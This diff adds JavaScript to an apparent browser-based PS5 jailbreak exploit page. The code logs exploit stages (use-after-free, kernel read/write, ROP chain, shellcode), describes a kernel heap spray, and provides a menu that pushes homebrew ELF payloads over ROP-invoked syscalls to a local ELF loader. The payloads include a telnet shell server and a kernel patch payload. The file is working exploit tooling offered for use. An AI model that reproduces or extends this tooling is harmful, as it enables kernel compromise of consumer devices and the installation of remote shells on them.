+function screenLine(text) {
+    screenLines.push(text.length > 120 ? text.slice(0, 117) + "..." : text);
+    if (screenLines.length > screenLineLimit)
+        screenLines.splice(0, screenLines.length - screenLineLimit);
+
+    if (raceMode) {
+        screenDirty = true;
+        const nowMs = Date.now();
+        if (nowMs - lastPaint < SCREEN_MS) return;
+        lastPaint = nowMs;
+        screenDirty = false;
+    }
+    try {
+        scrEl.textContent = screenLines.join("\n");
+    } catch { }
+}
+
+const CONCISE_SCREEN_SHOW = {
+    "POOPS-BOOT": 1,
+    "OFFSETS-READY": 1,
+    "TRIGGER-ARMED": 1,
+    "TRIGGER-FIRED": 1,
+    "LATCH-SET": 1,
+    "LATCH-ESCALATE": 1,
+    "LATCH-CLEAR": 1,
+    "LATCH-HELD": 1,
+    "LATCH-RELEASED": 1,
+    "POOPS-LATCHED": 1,
+    "POOPS-STALLED": 1,
+    "BOOT-STALLED": 1,
+    "CHAIN-DEAD": 1,
+    "STAGE5-DONE": 1,
+    "POOPS-COMPLETE": 1,
+    "POOPS-FAILED": 1,
+    "ELFLDR-MENU-VISIBLE": 1,
+    "ELF-SENT": 1,
+    "ELF-SEND-FAILED": 1,
+    "ELF-SENDER-BLOCKED": 1
+};
+const DEBUG_SCREEN_SHOW = /^(STAGE[0-5]-|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE)/;
+const REMOTE_DETAIL_SHOW = {
+    "STAGE1-FREE-T1": 1,
+    "STAGE1-HIT": 1,
+    "STAGE1-NO-SIG": 1,
+    "STAGE1-FDP": 1,
+    "KREAD-OK": 1,
+    "KREAD-REFUSED": 1,
+    "KSLOW-FAILED": 1,
+    "STAGE2-READ": 1,
+    "STAGE2-RETRY": 1,
+    "PROOF-CONSUMED": 1,
+    "KWRITE-OK": 1,
+    "KWRITE-IOV-CHANGED": 1,
+    "UIOW-RELEASED": 1,
+    "UIOW-RELEASE-FAILED": 1,
+    "STAGE3-CORRUPT-PRE": 1,
+    "STAGE3-READTEST-CROSS": 1,
+    "STAGE3-READTEST-PID": 1,
+    "STAGE3-READTEST-PID-SKIP": 1,
+    "STAGE3-WRITETEST": 1,
+    "ALIASES-REPAIRED": 1,
+    "RTHDR-REMOVED": 1,
+    "UAF-FILE-REMOVED": 1,
+    "ALLPROC-CHECK": 1,
+    "STAGE4-PRE": 1,
+    "STAGE4-KPROC-WALK-FAIL": 1,
+    "STAGE4-DYNLIB": 1,
+    "STAGE4-DYNLIB-SAFE": 1,
+    "STAGE4-VERIFY": 1,
+    "FAST-RW-SETUP-FAILED": 1
+};
+// NOT moved under /log/: the host's 204 route does not drain a request body, so a
+// POST there is answered with a connection reset. fetch() here is fully guarded so
+// the reset is swallowed, but this flush is batched and infrequent - trading a clean
+// 200 for an RST inside the exploit window buys nothing. Measured 2026-08-26.
+const REMOTE_LOG_URL = "/__poops_log";
+const REMOTE_LOG_STARTED = Date.now();
+const REMOTE_LOG_SESSION = REMOTE_LOG_STARTED.toString(36) + "-"
+    + Math.floor(Math.random() * 0x100000000).toString(36);
+const REMOTE_STAGE_SHOW = /^STAGE5-|^STAGE[0-4]-(ATTEMPT|OK|DONE|FAIL|FAILED|CONTROL|DEADLINE|VERIFY-FAILED|RW|ATTR|CREATE-RET|GETUID)$/;
+const REMOTE_STAGE5_FLUSH = /^STAGE5-(ENTER|STAGED|SHELLCODE-VERIFY|ALIAS-VERIFY|ARGS|PIPEBUF|SPAWN|CREATE-RET|JOIN-PRE|DONE)$/;
+const remoteEvents = [];
+let remoteSequence = 0, remoteFlushTimer = null, remoteEarlyAttached = false;
+
+function captureRemoteEvent(tag, extra) {
+    if (tag !== "TEST" && CONCISE_SCREEN_SHOW[tag] !== 1
+        && !/^(POOPS-|LATCH-|TRIGGER-)/.test(tag)
+        && tag !== "CHAIN-DEAD" && tag !== "PAGE-LEFT-MID-RUN"
+        && tag !== "OFFSETS-READY"
+        && REMOTE_DETAIL_SHOW[tag] !== 1
+        && !REMOTE_STAGE_SHOW.test(tag)) return;
+    remoteEvents.push({
+        seq: ++remoteSequence,
+        ms: Date.now() - REMOTE_LOG_STARTED,
+        tag: String(tag).slice(0, 64),
+        extra: extra == null ? "" : String(extra).slice(0, 1024)
+    });
+    if (remoteEvents.length > 120) remoteEvents.shift();
+    if (REMOTE_STAGE5_FLUSH.test(tag) && remoteFlushTimer === null)
+        remoteFlushTimer = setTimeout(function () {
+            remoteFlushTimer = null;
+            sendRemoteEvents(false);
+        }, 0);
+}
+
+function sendRemoteEvents(unloading) {
+    if (remoteFlushTimer !== null) {
+        clearTimeout(remoteFlushTimer);
+        remoteFlushTimer = null;
+    }
+    if (!remoteEvents.length) return Promise.resolve();
+    const events = remoteEvents.splice(0, remoteEvents.length);
+    const early = !remoteEarlyAttached && Array.isArray(window.__jbEarly)
+        ? window.__jbEarly.slice(-8) : [];
+    remoteEarlyAttached = true;
+    for (let i = 0; i < early.length && events.length < 128; ++i) {
+        events.push({
+            seq: ++remoteSequence,
+            ms: Date.now() - REMOTE_LOG_STARTED,
+            tag: "EARLY",
+            extra: String(early[i]).slice(0, 1024)
+        });
+    }
+    const body = JSON.stringify({
+        v: 1,
+        session: REMOTE_LOG_SESSION,
+        rev: REV,
+        fw: typeof window.fw_str === "string" ? window.fw_str : "",
+        page: location.pathname + location.search,
+        events: events
+    });
+    if (unloading && typeof navigator.sendBeacon === "function") {
+        try { if (navigator.sendBeacon(REMOTE_LOG_URL, body)) return Promise.resolve(); } catch (e) { }
+    }
+    try {
+        return fetch(REMOTE_LOG_URL, {
+            method: "POST",
+            headers: { "Content-Type": "text/plain;charset=UTF-8" },
+            body: body,
+            cache: "no-store"
+        }).then(function () { }, function () { });
+    } catch (e) { return Promise.resolve(); }
+}
+
+function screenMark(tag, extra) {
+    const s0 = extra == null ? "" : String(extra);
+    if (tag === "STAGE5-DONE" && /(?:^|-)joinRet=0(?:-|$)/.test(s0) &&
+        /(?:^|-)shellcodeRet=0x0+(?:-|$)/.test(s0)) {
+        elfldrSpawned = true;
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, "ELF LOADER READY");
+        stage("ELF LOADER READY", "ok");
+        showPayloadMenu();
+    }
+    catState(tag, s0);
+    captureRemoteEvent(tag, s0);
+    let line;
+    if (tag === "TEST") {
+
+        const m = /-why(=|%3D)/.exec(s0);
+        const i = m ? m.index : -1;
+        const head = i < 0 ? s0 : s0.slice(0, i);
+        line = head.replace(/-/, " ");
+        if (i >= 0 && /FAIL/.test(head))
+            line += ": " + s0.slice(i + m[0].length).replace(/_/g, " ");
+    } else if (tag === "TEST-ENTER") {
+        if (!LOG_DEBUG) return;
+        line = "> " + s0.replace(/-chainMarks.*$/, "").replace(/-/, " ");
+    } else if ((CONCISE_SCREEN_SHOW[tag] === 1
+        || (LOG_DEBUG && DEBUG_SCREEN_SHOW.test(tag)))
+        && !tag.endsWith("-PRE")) {
+        line = s0 ? tag + " " + s0.replace(/_/g, " ") : tag;
+    } else return;
+    if (line.length > 110) line = line.slice(0, 107) + "...";
+    screenLine(line);
+}
+
+function catState(tag, extra) {
+    try {
+        const c = document.getElementById("cat");
+        if (!c) return;
+        if (elfldrSpawned) { c.className = "ok"; return; }
+        if (tag !== "POOPS-COMPLETE") return;
+        const m = /-fail=(\d+)/.exec(extra || "");
+        const failed = m ? parseInt(m[1], 10) : 1;
+        c.className = failed === 0 ? "ok" : "bad";
+    } catch (e) { }
+}
+
+let marksQueued = 0;
+let marksBlocked = 0;
+const markStats = () => ({ queued: marksQueued, blocked: marksBlocked });
+function queueEvent(tag, extra) {
+    marksQueued++;
+    screenMark(tag, extra);
+}
+function flushQueue() { repaintScreen(); }
+
+function flushMark(tag, extra) {
+    // LOCAL DIAGNOSTIC: mirror every mark into the URL of a 1px image request.
+    // The host logs request PATHS, but /__poops_log is a POST and its body is
+    // discarded, so the stage trail was invisible in host-live.log. A GET puts
+    // the mark in the path, where the log captures it. Best-effort and silent:
+    // it must never affect the run.
+    try {
+        var __m = String(tag) + (extra == null ? "" : "-" + String(extra))
+            + "|fw=" + (window.fw_str === undefined ? "UNDEF"
+                        : (window.fw_str === "" ? "EMPTY" : window.fw_str));
+        // "log/", not "slog/": ps-exploit-host routes telemetry with
+        // strstr(url, "/log/") and answers an empty 204 precisely so a mark costs
+        // nothing during a spray. "/slog/" does not contain "/log/", so every one of
+        // these missed the route and took a 404 through the static handler instead -
+        // 976 in one observed run. __beaconOff is the same latch p2jb carries: on a
+        // host that does not serve the route at all these fail forever, and ~16k
+        // failing marks have killed the renderer with OOM before.
+        if (!window.__beaconOff) {
+            new Image().src = "log/" + encodeURIComponent(__m).slice(0, 300)
+                + "?t=" + (Date.now() % 100000);
+        }
+    } catch (e) { }
+
+    if (raceMode && CRITICAL_MARKS[tag] !== 1) { queueEvent(tag, extra); return; }
+    marksBlocked++;
+    screenMark(tag, extra);
+}
+
+const LATCH_KEY = "poopsploit-poops:latch";
+let latchState = storeGet(LATCH_KEY) ? "held" : "clear";
+const latch = {
+    async read() {
+        const detail = storeGet(LATCH_KEY);
+        latchState = detail ? "held" : "clear";
+        return { set: detail ? 1 : 0, detail };
+    },
+    async set(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-SET", d);
+        storeSet(LATCH_KEY, d || "set");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async escalate(detail) {
+        const d = clean(detail);
+        flushMark("LATCH-ESCALATE", d);
+        storeSet(LATCH_KEY, d || "escalated");
+        latchState = "held";
+        return { set: 1, detail: d };
+    },
+    async clear() {
+        flushMark("LATCH-CLEAR", "operator-request");
+        storeDel(LATCH_KEY);
+        latchState = "clear";
+        return { set: 0, detail: "" };
+    }
+};
+
+const stageEl = document.getElementById("stage");
+const dangerEl = document.getElementById("danger");
+const rebootEl = document.getElementById("reboot");
+const verdictEl = document.getElementById("verdict");
+const vitalsEl = document.getElementById("vitals");
+const cfgEl = document.getElementById("cfg");
+const rowsEl = document.getElementById("rows");
+const tallyEl = document.getElementById("tally");
+const summaryEl = document.getElementById("summary");
+const navEl = document.getElementById("nav");
+const payloadMenuEl = document.getElementById("payloads-view");
+const rowByKey = new Map();
+let payloadSendBusy = false;
+const PAYLOAD_PORT = 9021;
+const PAYLOAD_BUFFER_SIZE = 0x10000;
+const PAYLOAD_MAX_SIZE = 0x400000;
+let payloadSendStore = null;
+let payloadSockaddrStore = null;
+let payloadSocketOptionStore = null;
+let payloadSendTimeoutStore = null;
+let payloadSenderBlocked = "";
+let consoleNetworkInfo = { ip: "", name: "" };
+
+// Payload set kept IDENTICAL to p2jb / p2jb-dev (user request 2026-08-26), so a
+// console sees the same ELFs whichever site it came in through. Every name here
+// is checked against payloads\ by tools\site_check.py.
+const PAYLOADS = Object.freeze([
+    { title: "etaHEN", description: "Homebrew enabler and payload host.",
+        name: "etaHEN.elf", info: "etaHEN.elf" },
+    { title: "ps5-kstuff", description: "Kernel support payload and FPKG enabler.",
+        name: "kstuff.elf", info: "kstuff.elf - EchoStretch" },
+    { title: "ShadowMountPlus", description: "Mount and manage game images.",
+        name: "shadowmountplus.elf", info: "shadowmountplus.elf - Drakmor" },
+    { title: "Autoloader", description: "Runs a stored payload automatically.",
+        name: "autoloader.elf", info: "autoloader.elf" },
+    { title: "ftpsrv", description: "FTP server. Runs on port 2121.",
+        name: "ftpsrv-ps5.elf", info: "ftpsrv-ps5.elf - john-tornblom" },
+    { title: "Payload Manager", description: "Payload management tools.",
+        name: "pldmgr.elf", info: "pldmgr.elf" },
+    { title: "gdbsrv", description: "GDB server. Runs on port 2159.",
+        name: "gdbsrv-ps5.elf", info: "gdbsrv-ps5.elf - john-tornblom" },
+    { title: "klogsrv", description: "Kernel log server. Runs on port 3232.",
+        name: "klogsrv-ps5.elf", info: "klogsrv-ps5.elf - john-tornblom" },
+    { title: "shsrv", description: "Telnet shell server. Runs on port 2323.",
+        name: "shsrv-ps5.elf", info: "shsrv-ps5.elf - john-tornblom" },
+    { title: "websrv", description: "Homebrew web server. Runs on port 8080.",
+        name: "websrv-ps5.elf", info: "websrv-ps5.elf - john-tornblom" }
+]);
+
+function populatePayloadButtons() {
+    const grid = payloadMenuEl.getElementsByClassName("payloadGrid")[0];
+    if (!grid || grid.getElementsByClassName("payloadTile").length) return;
+
+    for (let i = 0; i < PAYLOADS.length; ++i) {
+        const payload = PAYLOADS[i];
+        const button = document.createElement("a");
+        button.classList.add("payloadTile");
+        button.classList.add("btn");
+        button.tabIndex = 0;
+        button.setAttribute("data-name", payload.name);
+
+        const title = document.createElement("p");
+        title.classList.add("payloadName");
+        title.classList.add("payload-btn-title");
+        title.textContent = payload.title;
+
+        const description = document.createElement("p");
+        description.classList.add("payload-btn-description");
+        description.textContent = payload.description;
+
+        const info = document.createElement("p");
+        info.classList.add("payloadStatus");
+        info.classList.add("payload-btn-info");
+        info.setAttribute("data-ready", payload.info);
+        info.textContent = payload.info.replace(" - ", " · ");
+
+        button.appendChild(title);
+        button.appendChild(description);
+        button.appendChild(info);
+        button.addEventListener("click", function (event) {
+            if (event && event.preventDefault) event.preventDefault();
+            sendPayloadInPlace(payload.name, button);
+        });
+        grid.appendChild(button);
+    }
+}
+populatePayloadButtons();
+
+function switchAppView(viewId) {
+    const main = document.getElementById("main-content");
+    const target = document.getElementById(viewId);
+    if (!main || !target) return;
+    if (viewId === "payloads-view")
+        document.body.classList.add("payload-view-active");
+    else
+        document.body.classList.remove("payload-view-active");
+    const views = main.getElementsByClassName("app-view");
+    for (let i = 0; i < views.length; ++i)
+        views[i].classList.remove("selected");
+    target.classList.add("selected");
+    void target.offsetHeight;
+}
+
+function setPayloadTileBusy(tile, busy) {
+    if (busy) tile.classList.add("busy");
+    else tile.classList.remove("busy");
+}
+
+function showPayloadMenu(readyState) {
+    const ready = readyState !== false;
+    populatePayloadButtons();
+
+    const prompt = document.getElementById("loaderPrompt");
+    prompt.classList.remove("on");
+    navEl.textContent = "";
+    navEl.style.display = "none";
+
+    payloadMenuEl.classList.add("on");
+    switchAppView("payloads-view");
+
+    const networkStatus = document.getElementById("payloadNetworkStatus");
+    if (networkStatus) {
+        networkStatus.innerHTML = consoleNetworkInfo.ip
+            ? "Listening on: <b>" + consoleNetworkInfo.ip + "</b> (port: 9021)"
+                + (consoleNetworkInfo.name ? " (" + consoleNetworkInfo.name + ")" : "")
+            : "Listening on console port 9021";
+    }
+
+    const grid = payloadMenuEl.getElementsByClassName("payloadGrid")[0];
+    if (grid) grid.removeAttribute("style");
+
+    const tiles = payloadMenuEl.getElementsByClassName("payloadTile");
+    for (let i = 0; i < tiles.length; ++i) {
+        setPayloadTileBusy(tiles[i], !ready);
+        tiles[i].style.pointerEvents = ready ? "auto" : "none";
+        tiles[i].tabIndex = ready ? 0 : -1;
+    }
+
+    const progress = document.getElementById("payloadProgress");
+    if (progress && ready)
+        progress.textContent = "Select a payload to send it to the ELF loader.";
+
+    setTimeout(function () {
+        const firstRect = tiles.length ? tiles[0].getBoundingClientRect() : null;
+        const firstStyle = tiles.length ? getComputedStyle(tiles[0]) : null;
+        const firstTitle = tiles.length
+            ? tiles[0].getElementsByClassName("payload-btn-title")[0] : null;
+        const titleStyle = firstTitle ? getComputedStyle(firstTitle) : null;
+        flushMark("ELFLDR-MENU-VISIBLE", "tiles=" + tiles.length
+            + "-menu=" + getComputedStyle(payloadMenuEl).display
+            + "-firstW=" + (firstRect ? Math.round(firstRect.width) : 0)
+            + "-firstH=" + (firstRect ? Math.round(firstRect.height) : 0)
+            + "-firstDisplay=" + (firstStyle ? firstStyle.display : "none")
+            + "-firstColor=" + (firstStyle ? firstStyle.color : "none")
+            + "-titleDisplay=" + (titleStyle ? titleStyle.display : "none")
+            + "-titleColor=" + (titleStyle ? titleStyle.color : "none")
+            + "-titleFill=" + (titleStyle
+                ? (titleStyle.webkitTextFillColor || "unset") : "none")
+            + "-titleText=" + (firstTitle ? clean(firstTitle.textContent) : "none"));
+        sendRemoteEvents(false);
+    }, 0);
+}
+function setPayloadTileState(tile, state) {
+    tile.setAttribute("data-state", state);
+    const status = tile.getElementsByClassName("payloadStatus")[0];
+    if (status)
+        status.textContent = state === "default"
+            ? (status.getAttribute("data-ready") || "Ready")
+            : state === "sending" ? "Sending"
+                : state === "sent" ? "Sent to port 9021" : "Failed";
+}
+
+async function probeExistingElfLoader() {
+    // Match UMTX2's safe probe: do not connect an empty client to elfldr.
+    // If bind(127.0.0.1:9021) fails, another socket already owns the port.
+    preparePayloadSender();
+    let fd = -1;
+    let portOwned = false;
+    try {
+        const opened = await sys(SYS_SOCKET, 2, 1, 0);
+        if (opened.failed || opened.s32 < 0) return false;
+        fd = opened.s32;
+        track(fd);
+        const bound = await sys(SYS_BIND, fd, payloadSockaddrStore.ptr, 0x10);
+        portOwned = bound.failed || bound.s32 < 0;
+    } finally {
+        if (fd >= 0 && !chainDead) {
+            try {
+                const closed = await sys(SYS_CLOSE, fd);
+                if (!closed.failed && closed.s32 === 0) untrack(fd);
+            } catch (e) { }
+        }
+    }
+    return portOwned;
+}
+
+function openExistingPayloadMenu() {
+    elfldrSpawned = true;
+    clearFailureBanners();
+    setCatResult(true);
+    showVerdict(false, "ELF LOADER ALREADY READY ON PORT 9021");
+    stage("ELF LOADER READY -- opening payload menu", "ok");
+    showPayloadMenu();
+    flushMark("ELFLDR-REUSED", "bind-probe-found-127.0.0.1-port=9021-owned");
+}
+
+function showLoaderPrompt() {
+    clearFailureBanners();
+    payloadMenuEl.classList.remove("on");
+    const prompt = document.getElementById("loaderPrompt");
+    prompt.classList.add("on");
+    switchAppView("prompt-view");
+    const promptButtons = prompt.getElementsByClassName("promptButton");
+    for (let i = 0; i < promptButtons.length; ++i) {
+        promptButtons[i].removeAttribute("style");
+    }
+    const button = document.getElementById("promptJailbreak");
+    button.href = PRODUCTION_HREF;
+    try { button.focus(); } catch (e) { }
+}
+
+async function refreshConsoleNetworkInfo() {
+    if (consoleNetworkInfo.ip) return consoleNetworkInfo;
+    try {
+        const countResult = await sys(SYS_NETGETIFLIST, 0, 10);
+        if (countResult.failed || countResult.s32 <= 0)
+            throw payloadSyscallError("netgetiflist count", countResult);
+        const count = Math.min(countResult.s32, 32);
+        const recordSize = 0x3c0;
+        const records = mem(recordSize * count);
+        records.u8.fill(0);
+        const listResult = await sys(SYS_NETGETIFLIST, records.ptr, count);
+        if (listResult.failed)
+            throw payloadSyscallError("netgetiflist records", listResult);
+        for (let i = 0; i < count; ++i) {
+            const base = i * recordSize;
+            const octets = [records.u8[base + 40], records.u8[base + 41],
+                records.u8[base + 42], records.u8[base + 43]];
+            const ip = octets.join(".");
+            if (ip === "0.0.0.0" || ip === "127.0.0.1") continue;
+            let name = "";
+            for (let j = 0; j < 16 && records.u8[base + j]; ++j)
+                name += String.fromCharCode(records.u8[base + j]);
+            consoleNetworkInfo = { ip: ip, name: name };
+            flushMark("CONSOLE-NETWORK", "ip=" + clean(ip) + "-if=" + clean(name));
+            break;
+        }
+    } catch (error) {
+        flushMark("CONSOLE-NETWORK-FAILED", clean(error && error.message
+            ? error.message : error));
+    }
+    return consoleNetworkInfo;
+}
+
+function payloadIsListed(name) {
+    if (!/^[A-Za-z0-9._-]+\.elf$/.test(name)) return false;
+    const tiles = payloadMenuEl.getElementsByClassName("payloadTile");
+    for (let i = 0; i < tiles.length; ++i)
+        if (tiles[i].getAttribute("data-name") === name) return true;
+    return false;
+}
+
+function payloadSyscallError(operation, result) {
+    let detail = result && result.errText
+        ? result.errText : "unknown syscall error";
+    if (result)
+        detail += " (s32=" + result.s32 + ", raw=" + result.hex + ")";
+    return new Error(operation + " failed: " + detail);
+}
+
+function preparePayloadSender() {
+    if (payloadSendStore === null)
+        payloadSendStore = mem(PAYLOAD_BUFFER_SIZE);
+    if (payloadSockaddrStore === null) {
+        payloadSockaddrStore = mem(0x10);
+        const addr = payloadSockaddrStore.u8;
+        addr.fill(0);
+        addr[0] = 0x10;
+        addr[1] = 0x02;
+        addr[2] = (PAYLOAD_PORT >>> 8) & 0xff;
+        addr[3] = PAYLOAD_PORT & 0xff;
+        addr[4] = 127;
+        addr[5] = 0;
+        addr[6] = 0;
+        addr[7] = 1;
+    }
+    if (payloadSocketOptionStore === null) {
+        payloadSocketOptionStore = mem(4);
+        payloadSocketOptionStore.u8.fill(0);
+        payloadSocketOptionStore.u8[0] = 1;
+    }
+    if (payloadSendTimeoutStore === null) {
+        payloadSendTimeoutStore = mem(0x10);
+        payloadSendTimeoutStore.u8.fill(0);
+        payloadSendTimeoutStore.u8[0] = 15;
+    }
+}
+
+async function sendPayloadToElfldr(name) {
+    if (!elfldrSpawned)
+        throw new Error("ELF loader is not ready");
+    if (!P || !chain)
+        throw new Error("the post-jailbreak ROP runtime is unavailable");
+    if (chainDead)
+        throw new Error("the ROP chain is unusable after " + chainDead);
+    if (payloadSenderBlocked)
+        throw new Error(payloadSenderBlocked);
+    if (!payloadIsListed(name))
+        throw new Error("payload is not listed in this menu");
+
+    const response = await fetch("../payloads/" + encodeURIComponent(name),
+        { cache: "no-store" });
+    if (!response.ok)
+        throw new Error("payload fetch failed: HTTP " + response.status);
+    const bytes = new Uint8Array(await response.arrayBuffer());
+    if (!bytes.length)
+        throw new Error("payload is empty");
+    if (bytes.length > PAYLOAD_MAX_SIZE)
+        throw new Error("payload is larger than the 4 MiB limit");
+    if (bytes.length < 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45
+        || bytes[2] !== 0x4c || bytes[3] !== 0x46)
+        throw new Error("payload does not start with the ELF signature");
+
+    preparePayloadSender();
+    let fd = -1;
+    let sent = 0;
+    let failure = null;
+    let closeWarning = null;
+    try {
+        let result = await sys(SYS_SOCKET, 2, 1, 0);
+        if (result.failed || result.s32 < 0)
+            throw payloadSyscallError("socket", result);
+        fd = result.s32;
+        track(fd);
+
+        result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x0800,
+            payloadSocketOptionStore.ptr, 4);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("setsockopt SO_NOSIGPIPE", result);
+
+        result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x1005,
+            payloadSendTimeoutStore.ptr, 0x10);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("setsockopt SO_SNDTIMEO", result);
+
+        result = await sys(SYS_CONNECT, fd, payloadSockaddrStore.ptr, 0x10);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("connect to 127.0.0.1:9021", result);
+
+        while (sent < bytes.length) {
+            const blockSize = Math.min(PAYLOAD_BUFFER_SIZE, bytes.length - sent);
+            payloadSendStore.u8.set(bytes.subarray(sent, sent + blockSize), 0);
+            let blockSent = 0;
+            while (blockSent < blockSize) {
+                result = await sys(SYS_WRITE, fd,
+                    payloadSendStore.ptr.add32(blockSent), blockSize - blockSent);
+                if (result.failed || result.s32 <= 0)
+                    throw payloadSyscallError("write at byte "
+                        + (sent + blockSent), result);
+                blockSent += result.s32;
+            }
+            sent += blockSize;
+        }
+    } catch (error) {
+        failure = error;
+    }
+
+    if (fd >= 0 && !chainDead) {
+        try {
+            const result = await sys(SYS_CLOSE, fd);
+            if (result.failed || result.s32 !== 0) {
+                const error = payloadSyscallError("close", result);
+                if (failure === null && sent === bytes.length)
+                    closeWarning = error;
+                else if (failure === null)
+                    failure = error;
+                else
+                    failure = new Error(failure.message + "; additionally, "
+                        + error.message);
+            } else {
+                untrack(fd);
+            }
+        } catch (error) {
+            if (failure === null && sent === bytes.length)
+                closeWarning = error;
+            else if (failure === null)
+                failure = error;
+            else
+                failure = new Error(failure.message + "; additionally, close failed: "
+                    + (error && error.message ? error.message : error));
+        }
+    } else if (fd >= 0 && failure !== null) {
+        failure = new Error(failure.message + "; socket fd " + fd
+            + " remains tracked because the ROP chain is unusable");
+    }
+
+    if (fd >= 0 && state.fdOpen.has(fd))
+        payloadSenderBlocked = "payload sending is blocked until reboot because "
+            + "socket fd " + fd + " was not confirmed closed";
+
+    if (failure !== null) throw failure;
+    return { name, bytes: sent, target: "127.0.0.1", port: PAYLOAD_PORT,
+        closeWarning: closeWarning };
+}
+
+async function sendPayloadInPlace(name, tile) {
+    if (payloadSendBusy) return;
+    payloadSendBusy = true;
+    const titleEl = tile.getElementsByClassName("payloadName")[0];
+    const title = titleEl ? titleEl.textContent : name;
+    const toast = showPayloadToast(title + ": Fetching...");
+    const tiles = payloadMenuEl.getElementsByClassName("payloadTile");
+    for (let i = 0; i < tiles.length; ++i)
+        setPayloadTileBusy(tiles[i], true);
+    setPayloadTileBusy(tile, false);
+    setPayloadTileState(tile, "sending");
+    try {
+        updatePayloadToast(toast, title + ": Sending to port 9021...");
+        const result = await sendPayloadToElfldr(name);
+        setPayloadTileBusy(tile, false);
+        setPayloadTileState(tile, "sent");
+        updatePayloadToast(toast, title + ": Sent to port 9021");
+        dismissPayloadToast(toast, 2000);
+        flushMark("ELF-SENT", "name=" + clean(result.name) + "-bytes="
+            + result.bytes + "-target=" + clean(result.target)
+            + "-port=" + result.port);
+        if (result.closeWarning)
+            flushMark("ELF-SOCKET-CLOSE-WARN", "name=" + clean(result.name)
+                + "-why=" + clean(result.closeWarning.message || result.closeWarning));
+    } catch (error) {
+        setPayloadTileBusy(tile, false);
+        setPayloadTileState(tile, "failed");
+        updatePayloadToast(toast, title + ": Error: "
+            + (error && error.message ? error.message : error));
+        dismissPayloadToast(toast, 5000);
+        flushMark("ELF-SEND-FAILED", "name=" + clean(name) + "-why="
+            + clean(error && error.message ? error.message : error));
+    } finally {
+        if (payloadSenderBlocked) {
+            payloadSendBusy = true;
+            for (let i = 0; i < tiles.length; ++i)
+                setPayloadTileBusy(tiles[i], true);
+            setCatResult(false);
+            flushMark("ELF-SENDER-BLOCKED", clean(payloadSenderBlocked));
+        } else {
+            payloadSendBusy = false;
+            for (let i = 0; i < tiles.length; ++i)
+                if (tiles[i] !== tile) setPayloadTileBusy(tiles[i], false);
+            try { tile.focus(); } catch (e) { }
+        }
+    }
+}
+
+function showPayloadToast(message) {
+    const container = document.getElementById("payloadToastContainer");
+    const toast = document.createElement("div");
+    toast.className = "payloadToast";
+    toast.textContent = message;
+    container.appendChild(toast);
+    return toast;
+}
+
+function updatePayloadToast(toast, message) {
+    if (toast) toast.textContent = message;
+}
+
+function dismissPayloadToast(toast, delay) {
+    setTimeout(function () {
+        if (!toast) return;
+        toast.className = "payloadToast hide";
+        setTimeout(function () {
+            if (toast.parentNode) toast.parentNode.removeChild(toast);
+        }, 450);
+    }, delay);
+}
+
+function stage(text, cls) {
+    if (cls === "bad") setCatResult(false);
+    if (elfldrSpawned && cls === "bad") return;
+    stageEl.textContent = text;
+    stageEl.className = cls || "";
+}
+function danger(text) {
+    if (elfldrSpawned) return;
+    setCatResult(false);
+    dangerEl.textContent = text;
+    dangerEl.className = "";
+}
+
+function clearFailureBanners() {
+    dangerEl.textContent = "";
+    dangerEl.className = "";
+    verdictEl.textContent = "";
+    verdictEl.className = "";
+}
+
+function setCatResult(success) {
+    const cat = document.getElementById("cat");
+    const failureMessage = document.getElementById("failureMessage");
+    if (failureMessage) failureMessage.className = success ? "" : "on";
+    if (cat) {
+        cat.className = success ? "ok" : "bad";
+        if (success) {
+            const image = document.getElementById("catImage");
+            if (image) image.src = "cat.jpg";
+        }
+    }
+}
+
+function verdictBanner(kind, text) {
+    if (kind === "bad") setCatResult(false);
+    if (elfldrSpawned && kind === "bad") return;
+    verdictEl.textContent = text;
+    verdictEl.className = kind || "";
+}
+function vitals(text) { vitalsEl.textContent = text; vitalsEl.className = "on"; }
+
+function showVerdict(reboot, text) {
+    if (reboot) setCatResult(false);
+    if (elfldrSpawned && reboot) {
+        rebootEl.textContent = "ELF LOADER READY";
+        rebootEl.className = "on fine";
+        return;
+    }
+    rebootEl.textContent = text;
+    rebootEl.className = reboot ? "" : "fine";
+}
+
+function vitalsText(prefix) {
+    const common = prefix + cfg.sockets + " IPv6 SOCKETS (up to "
+        + (cfg.sockets * 360) + " BYTES of kernel routing headers, sprayed and " + "freed repeatedly), 2 AF_UNIX SOCKETPAIRS, 2 PIPES, and TWELVE " + "raw kernel threads pinned to one core at PRI_REALTIME/256.\n";
+    if (cfg.trigger === "none")
+        return common
+            + "TRIGGER: NONE";
+    if (cfg.trigger === "netcontrol")
+        return common
+            + "TRIGGER: NETCONTROL";
+    return common
+        + "TRIGGER: OVERFLOW (p2jb's prepare_fds)" + "corrupt the kernel if burn=full.\n" + "  * RLIMIT_NOFILE raised, up to " + 2048 + " descriptors opened.\n" + "  * setuid(1) x2 -- IRREVERSIBLE for the rest of the boot.\n" + "  * burn=" + cfg.burn + "";
+}
+
+let chainMarksQuiet = false;
+function jbMarkSink(tag, extra) {
+    if (chainMarksQuiet) queueEvent(tag, extra);
+    else flushMark(tag, extra);
+}
+function setChainMarksQuiet(quiet) {
+    const was = chainMarksQuiet;
+    chainMarksQuiet = !!quiet;
+    return was;
+}
+if (!window.jb) window.jb = {};
+if (typeof window.jb.mark !== "function") window.jb.mark = jbMarkSink;
+
+function row(idx, entry, status, detail, notes) {
+    let tr = rowByKey.get(entry.key);
+    if (tr === undefined) {
+        tr = document.createElement("tr");
+        tr.innerHTML = '<td class="n"></td><td class="k"></td>'
+            + '<td class="st"></td><td class="d"></td>';
+        rowsEl.appendChild(tr);
+        rowByKey.set(entry.key, tr);
+    }
+    tr.children[0].textContent = String(idx);
+    tr.children[1].innerHTML = "";
+    const nm = document.createElement("span");
+    nm.textContent = entry.label;
+    const cl = document.createElement("span");
+    cl.className = "cls";
+    cl.textContent = entry.cls;
